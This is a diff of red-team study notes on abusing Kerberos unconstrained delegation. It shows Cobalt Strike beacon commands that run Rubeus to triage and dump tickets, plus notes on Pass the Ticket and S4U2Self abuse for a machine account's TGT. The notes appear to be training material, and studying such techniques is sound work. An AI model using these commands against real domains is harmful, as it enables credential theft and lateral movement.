@@ -20,7 +20,7 @@ Domain Controllers always have this feature enabled.
 `beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage`
 
 3) Analyze the tickets displayed, one of those could be related/interacting with one of the machines you want access into (maybe the DC). 
-4) If you identify one potential candidate, dump it, then create a new process locally using the ticket:
+4) If you identify one potential candidate, dump it, then create a new process locally using the ticket ([[Pass the Ticket]]) :
 
 ```
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
@@ -84,7 +84,7 @@ Where:
 doIFuj[...]lDLklP
 ```
 
-4) With the ticket, since it's a machine account's TGT we have to use [[S4U2Self Abuse]] .
+4) If you pass the ticket here it would fail since it's a machine account's TGT. We have to use [[S4U2Self Abuse]] instead. We have to use this method because machines do not get remote local admin access to themselves. 
 
 
 
